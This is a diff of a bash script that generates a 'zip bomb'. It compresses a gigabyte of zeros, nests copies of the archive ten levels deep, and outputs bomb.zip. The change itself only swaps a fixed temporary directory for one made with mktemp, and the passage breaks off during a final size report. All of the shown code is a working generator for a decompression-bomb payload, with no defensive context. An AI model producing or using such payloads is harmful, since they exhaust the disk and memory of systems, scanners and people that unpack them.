@@ -1,22 +1,22 @@
 #!/usr/bin/env bash
 
-mkdir -p /tmp/zipbomb
-dd if=/dev/zero bs=1M count=1024 | zip /tmp/zipbomb/garbage.zip -
+dir=$(mktemp -d /tmp/zipbombXXXX)
+dd if=/dev/zero bs=1M count=1024 | zip $dir/garbage.zip -
 
 i=0
 while [ $i -lt 10 ]; do
   j=0
   while [ $j -lt 10 ]; do
-    cp /tmp/zipbomb/garbage.zip /tmp/zipbomb/$j.zip
+    cp $dir/garbage.zip $dir/$j.zip
     j=$(($j + 1))
   done
-  zip -9 /tmp/zipbomb/garbage.zip /tmp/zipbomb/?.zip
+  zip -9 $dir/garbage.zip $dir/?.zip
   i=$(($i + 1))
 done
 
-zip -9 bomb.zip /tmp/zipbomb/garbage.zip
+zip -9 bomb.zip $dir/garbage.zip
 
-rm -fr /tmp/zipbomb
+rm -fr $dir
 
 which bc >&- 2>&- && {
   final=$(du -h bomb.zip | cut -d'	' -f1)
